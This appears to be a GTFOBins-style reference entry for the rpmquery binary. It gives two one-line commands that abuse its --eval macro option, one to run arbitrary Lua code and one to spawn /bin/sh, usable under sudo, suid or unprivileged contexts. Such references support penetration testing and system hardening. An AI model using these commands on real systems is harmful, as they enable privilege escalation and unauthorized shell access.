---
type: gtfobin
name: rpmquery
platform: Unix
functions: [inherit, shell]
tags: [gtfobin, unix, lotl]
---

# rpmquery

## inherit

```bash
rpmquery --eval '%{lua:...}'
```
_This allows to run Lua code (`...`)._
**Contexts:** sudo, suid, unprivileged

## shell

```bash
rpmquery --eval '%(/bin/sh 1>&2)'
```
**Contexts:** sudo, suid, unprivileged
